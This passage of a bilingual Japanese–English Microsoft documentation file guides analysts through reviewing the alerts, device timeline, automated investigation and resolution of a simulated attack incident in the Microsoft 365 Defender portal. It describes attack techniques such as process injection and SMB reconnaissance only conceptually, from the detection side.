<span data-ttu-id="b3c19-209">このシミュレーション中に生成されたアラートは同じ脅威に関連付けられるので、その結果、1 つのインシデントとして自動的に集計されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-209">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="b3c19-210">インシデントを表示するには、次の方法を実行します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-210">To view the incident:</span></span>

1. <span data-ttu-id="b3c19-211">ポータルを[開Microsoft 365 Defenderします](https://security.microsoft.com/)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-211">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="b3c19-212">ナビゲーション ウィンドウで、[インシデント] を選択 **し、[インシデント&通知>選択します**。</span><span class="sxs-lookup"><span data-stu-id="b3c19-212">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="b3c19-213">インシデント名の左側にある円をクリックして、最新のアイテムを選択します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-213">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="b3c19-214">サイド パネルには、関連するアラートを含むインシデントに関する追加情報が表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-214">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="b3c19-215">各インシデントには、含まれるアラートの属性に基づいて説明する一意の名前があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-215">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   <span data-ttu-id="b3c19-216">ダッシュボードに表示されるアラートは、サービス リソース (Microsoft Defender for Identity、Microsoft Cloud App Security、Microsoft Defender for Endpoint、Microsoft 365 Defender、Microsoft Defender for Office 365) に基づいてフィルター処理できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-216">The alerts that are shown in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="b3c19-217">インシデント **の詳細を取得するには、[** インシデント ページを開く] を選択します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-217">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="b3c19-218">[インシデント **] ページ** では、インシデントに関連するアラートと情報を確認できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-218">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="b3c19-219">この情報には、アラートに関連するエンティティとアセット、アラートの検出ソース (Microsoft Defender for Identity、Microsoft Defender for Endpoint など)、およびアラートがリンクされた理由が含まれます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-219">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (such as Microsoft Defender for Identity or Microsoft Defender for Endpoint), and the reason they were linked together.</span></span> <span data-ttu-id="b3c19-220">インシデントアラートリストを確認すると、攻撃の進行状況が表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-220">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="b3c19-221">このビューから、個々のアラートを確認および調査できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-221">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="b3c19-222">右側のメニューから [ **インシデント** の管理] をクリックして、インシデントにタグを付け、自分に割り当て、コメントを追加することもできます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-222">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

#### <a name="review-generated-alerts"></a><span data-ttu-id="b3c19-223">生成されたアラートを確認する</span><span class="sxs-lookup"><span data-stu-id="b3c19-223">Review generated alerts</span></span>

<span data-ttu-id="b3c19-224">シミュレートされた攻撃中に生成されたアラートの一部を見てみよ。</span><span class="sxs-lookup"><span data-stu-id="b3c19-224">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="b3c19-225">シミュレートされた攻撃中に生成されたアラートの一部のみを実行します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-225">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="b3c19-226">テスト デバイスで実行されている Windowsおよび Microsoft 365 Defender 製品のバージョンによっては、少し異なる順序で表示されるアラートが多く表示される場合があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-226">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![生成されたアラートの例](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="b3c19-228">アラート: 疑わしいプロセスの挿入が観察されました (ソース: Microsoft Defender for Endpoint)</span><span class="sxs-lookup"><span data-stu-id="b3c19-228">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="b3c19-229">高度な攻撃者は、高度でステルス性の高い方法を使用してメモリを保持し、検出ツールから隠します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-229">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="b3c19-230">一般的な手法の 1 つは、悪意のある実行可能ファイルではなく、信頼できるシステム プロセス内から操作し、検出ツールやセキュリティ操作が悪意のあるコードを見つけるのを難しくする方法です。</span><span class="sxs-lookup"><span data-stu-id="b3c19-230">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="b3c19-231">SOC アナリストがこれらの高度な攻撃をキャッチできるよう、Microsoft Defender for Endpoint のディープ メモリ センサーは、さまざまなクロスプロセス コードインジェクション手法をこれまでにない可視性でクラウド サービスに提供します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-231">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="b3c19-232">次の図は、Defender for Endpoint がコードを挿入しようとして検出され、警告を受け取った<i>notepad.exe。 </i></span><span class="sxs-lookup"><span data-stu-id="b3c19-232">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![悪意のある可能性のあるコードの挿入に関するアラートの例](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="b3c19-234">警告: コマンド ライン引数を使用しないプロセス実行で予期しない動作が発生します (ソース: Microsoft Defender for Endpoint)</span><span class="sxs-lookup"><span data-stu-id="b3c19-234">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="b3c19-235">Microsoft Defender for Endpoint の検出は、攻撃手法の最も一般的な属性をターゲットにしている場合が多い。</span><span class="sxs-lookup"><span data-stu-id="b3c19-235">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="b3c19-236">このメソッドは、耐久性を確保し、攻撃者が新しい戦術に切り替えるバーを上げる。</span><span class="sxs-lookup"><span data-stu-id="b3c19-236">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="b3c19-237">大規模な学習アルゴリズムを使用して、組織内および世界中の共通プロセスの通常の動作を確立し、これらのプロセスが異常な動作を示す状況を監視します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-237">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="b3c19-238">これらの異常な動作は、多くの場合、余分なコードが導入され、それ以外の場合は信頼できるプロセスで実行されている状態を示しています。</span><span class="sxs-lookup"><span data-stu-id="b3c19-238">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="b3c19-239">このシナリオでは、 <i> プロセスが </i>notepad.exe、外部の場所との通信を伴う異常な動作を示しています。</span><span class="sxs-lookup"><span data-stu-id="b3c19-239">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="b3c19-240">この結果は、悪意のあるコードの導入と実行に使用される特定のメソッドとは独立しています。</span><span class="sxs-lookup"><span data-stu-id="b3c19-240">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="b3c19-241">このアラートは、追加のバックエンド処理を必要とする機械学習モデルに基づくため、ポータルでこのアラートが表示されるには時間がかかる場合があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-241">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="b3c19-242">アラートの詳細には、調査を展開するピボットとして使用できるインジケーターである外部 IP アドレスが含まれます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-242">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="b3c19-243">アラート プロセス ツリーで IP アドレスを選択して、[IP アドレスの詳細] ページを表示します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-243">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![コマンド ライン引数を使用しないプロセス実行による予期しない動作に対するアラートの例](../../media/mtp/fig8.png)

<span data-ttu-id="b3c19-245">次の図は、選択した IP アドレスの詳細ページを表示します (アラート プロセス ツリーの IP アドレスをクリックします)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-245">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>

![IP アドレスの詳細ページの例](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="b3c19-247">アラート: ユーザーと IP アドレスの偵察 (SMB) (ソース: Microsoft Defender for Identity)</span><span class="sxs-lookup"><span data-stu-id="b3c19-247">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="b3c19-248">サーバー メッセージ ブロック (SMB) プロトコルを使用した列挙により、攻撃者は、ネットワークを横方向に移動して特定の機密性の高いアカウントにアクセスするのに役立つ、最近のユーザー ログオン情報を取得できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-248">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="b3c19-249">この検出では、SMB セッション列挙がドメイン コントローラーに対して実行されると、アラートがトリガーされます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-249">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![ユーザーと IP アドレスの偵察に関する Microsoft Defender for Identity アラートの例](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a><span data-ttu-id="b3c19-251">Microsoft Defender for Endpoint でデバイスのタイムラインを確認する</span><span class="sxs-lookup"><span data-stu-id="b3c19-251">Review the device timeline with Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="b3c19-252">このインシデントのさまざまなアラートを確認した後、前に調査したインシデント ページに戻ります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-252">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="b3c19-253">インシデント ページ **の [デバイス** ] タブを選択して、Microsoft Defender for Endpoint および Microsoft Defender for Identity によって報告されたこのインシデントに関連するデバイスを確認します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-253">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="b3c19-254">攻撃が行われたデバイスの名前を選択して、その特定のデバイスのエンティティ ページを開きます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-254">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="b3c19-255">そのページで、トリガーされたアラートと関連イベントを確認できます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-255">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="b3c19-256">[タイムライン **] タブ** を選択して、デバイスのタイムラインを開き、発生したアラートと一緒にデバイスで観察されたイベントと動作を時系列順に表示します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-256">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![動作を持つデバイスタイムラインの例](../../media/mtp/fig11.png)

<span data-ttu-id="b3c19-258">より興味深い動作の一部を展開すると、プロセス ツリーなどの有用な詳細が提供されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-258">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="b3c19-259">たとえば、警告イベント [疑わしいプロセスの挿入が観察されるまで **下にスクロールします**。</span><span class="sxs-lookup"><span data-stu-id="b3c19-259">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="b3c19-260">その下 **powershell.exe** プロセス notepad.exeに挿入するイベントを選択し、この動作の完全なプロセス ツリーをサイド ウィンドウの **[イベント** エンティティ] グラフに表示します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-260">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="b3c19-261">必要に応じて、検索バーを使用してフィルター処理を行います。</span><span class="sxs-lookup"><span data-stu-id="b3c19-261">Use the search bar for filtering if necessary.</span></span>

![選択した PowerShell ファイル作成動作のプロセス ツリーの例](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a><span data-ttu-id="b3c19-263">[ユーザー情報] を使用してユーザー Microsoft Cloud App Security</span><span class="sxs-lookup"><span data-stu-id="b3c19-263">Review the user information with Microsoft Cloud App Security</span></span>

<span data-ttu-id="b3c19-264">インシデント ページで、[ユーザー] **タブを** 選択して、攻撃に関与するユーザーの一覧を表示します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-264">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="b3c19-265">この表には、各ユーザーの調査優先度スコアを含む、各ユーザーに関する **追加情報が含** まれている。</span><span class="sxs-lookup"><span data-stu-id="b3c19-265">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="b3c19-266">ユーザー名を選択して、ユーザーのプロファイル ページを開き、詳細な調査を行います。</span><span class="sxs-lookup"><span data-stu-id="b3c19-266">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="b3c19-267">[リスクの高いユーザーの調査について詳しくは、以下の記事を参照してください](/cloud-app-security/tutorial-ueba#identify)。</span><span class="sxs-lookup"><span data-stu-id="b3c19-267">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![ユーザー ページCloud App Security例](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a><span data-ttu-id="b3c19-269">調査と修復の自動化</span><span class="sxs-lookup"><span data-stu-id="b3c19-269">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="b3c19-270">このシミュレーションを実行する前に、次のビデオを見て、自動自己修復とは何か、ポータルでどこで見つけるか、セキュリティ操作でどのように役立つのかを理解してください。</span><span class="sxs-lookup"><span data-stu-id="b3c19-270">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="b3c19-271">ポータルでインシデントに戻Microsoft 365 Defenderします。</span><span class="sxs-lookup"><span data-stu-id="b3c19-271">Navigate back to the incident in the Microsoft 365 Defender portal.</span></span> <span data-ttu-id="b3c19-272">[**インシデント] ページの\*\*\*\*[調査**] タブには、Microsoft Defender for Identity と Microsoft Defender for Endpoint によってトリガーされた自動調査が表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-272">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="b3c19-273">次のスクリーンショットは、Defender for Endpoint によってトリガーされた自動調査のみを表示します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-273">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="b3c19-274">既定では、Defender for Endpoint はキュー内にあるアーティファクトを自動的に修復します。修復が必要です。</span><span class="sxs-lookup"><span data-stu-id="b3c19-274">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![インシデントに関連する自動調査の例](../../media/mtp/fig14.png)

<span data-ttu-id="b3c19-276">調査をトリガーしたアラートを選択して、[調査の詳細] **ページを開** きます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-276">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="b3c19-277">次の詳細が表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-277">You'll see the following details:</span></span>

- <span data-ttu-id="b3c19-278">自動調査をトリガーしたアラート。</span><span class="sxs-lookup"><span data-stu-id="b3c19-278">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="b3c19-279">影響を受け取ったユーザーとデバイス。</span><span class="sxs-lookup"><span data-stu-id="b3c19-279">Impacted users and devices.</span></span> <span data-ttu-id="b3c19-280">追加のデバイスでインジケーターが見つかった場合は、これらの追加のデバイスも一覧表示されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-280">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="b3c19-281">証拠の一覧。</span><span class="sxs-lookup"><span data-stu-id="b3c19-281">List of evidence.</span></span> <span data-ttu-id="b3c19-282">ファイル、プロセス、サービス、ドライバー、ネットワーク アドレスなど、検出および分析されたエンティティ。</span><span class="sxs-lookup"><span data-stu-id="b3c19-282">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="b3c19-283">これらのエンティティは、アラートに対して考えられる関係について分析され、良性または悪意のあると評価されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-283">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="b3c19-284">脅威が見つかりました。</span><span class="sxs-lookup"><span data-stu-id="b3c19-284">Threats found.</span></span> <span data-ttu-id="b3c19-285">調査中に検出された既知の脅威。</span><span class="sxs-lookup"><span data-stu-id="b3c19-285">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="b3c19-286">タイミングによっては、自動調査がまだ実行されている可能性があります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-286">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="b3c19-287">証拠を収集して分析し、結果を確認する前に、プロセスが完了するまで数分待ちます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-287">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="b3c19-288">[調査の **詳細] ページを** 更新して、最新の結果を取得します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-288">Refresh the **Investigation details** page to get the latest findings.</span></span>

![[調査の詳細] ページの例](../../media/mtp/fig15.png)

<span data-ttu-id="b3c19-290">自動化された調査の間、Microsoft Defender for Endpoint は修復が必要な成果物の 1 notepad.exeプロセスを特定しました。</span><span class="sxs-lookup"><span data-stu-id="b3c19-290">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="b3c19-291">Defender for Endpoint は、自動修復の一環として疑わしいプロセスの挿入を自動的に停止します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-291">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="b3c19-292">テスト デバイス上 <i>notepad.exe</i> プロセスの一覧から表示されなくなります。</span><span class="sxs-lookup"><span data-stu-id="b3c19-292">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

#### <a name="resolve-the-incident"></a><span data-ttu-id="b3c19-293">インシデントを解決する</span><span class="sxs-lookup"><span data-stu-id="b3c19-293">Resolve the incident</span></span>

<span data-ttu-id="b3c19-294">調査が完了し、修復が確認された後、インシデントを解決します。</span><span class="sxs-lookup"><span data-stu-id="b3c19-294">After the investigation is complete and confirmed to be remediated, you resolve the incident.</span></span>

<span data-ttu-id="b3c19-295">[インシデント] **ページで** 、[インシデントの管理 **] を選択します**。</span><span class="sxs-lookup"><span data-stu-id="b3c19-295">From the **Incident** page, select **Manage incident**.</span></span> <span data-ttu-id="b3c19-296">状態を [インシデントの **解決] に** 設定し、分類に対して **[True alert]** を選択し、判定に **対してセキュリティ テスト** を行います。</span><span class="sxs-lookup"><span data-stu-id="b3c19-296">Set the status to **Resolve incident** and select **True alert** for the classification and **Security testing** for the determination.</span></span>

![[インシデントの管理] パネルを開いたインシデント ページの例を示します。スイッチをクリックしてインシデントを解決できます。](../../media/mtp/fig16.png)

<span data-ttu-id="b3c19-298">インシデントが解決すると、関連付けられているすべてのアラートが、Microsoft 365 Defenderポータルで解決されます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-298">When the incident is resolved, it resolves all of the associated alerts in Microsoft 365 Defender portal and in the related portals.</span></span>

<span data-ttu-id="b3c19-299">これにより、インシデント分析、自動調査、インシデント解決のための攻撃シミュレーションがラップされます。</span><span class="sxs-lookup"><span data-stu-id="b3c19-299">This wraps up the attack simulation for incident analysis, automated investigation, and incident resolution.</span></span>

## <a name="next-step"></a><span data-ttu-id="b3c19-300">次の手順</span><span class="sxs-lookup"><span data-stu-id="b3c19-300">Next step</span></span>

<span data-ttu-id="b3c19-301">[![インシデントMicrosoft 365 Defender機能を試す](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="b3c19-301">[![Try Microsoft 365 Defender incident response capabilities](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span></span>

<span data-ttu-id="b3c19-302">手順 2 / 2:[インシデント対応Microsoft 365 Defender試す](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="b3c19-302">Step 2 of 2: [Try Microsoft 365 Defender incident response capabilities](eval-defender-investigate-respond-additional.md)</span></span>

### <a name="navigation-you-may-need"></a><span data-ttu-id="b3c19-303">必要なナビゲーション</span><span class="sxs-lookup"><span data-stu-id="b3c19-303">Navigation you may need</span></span>

[<span data-ttu-id="b3c19-304">評価環境Microsoft 365 Defender作成する</span><span class="sxs-lookup"><span data-stu-id="b3c19-304">Create the Microsoft 365 Defender Evaluation Environment</span></span>](eval-create-eval-environment.md)
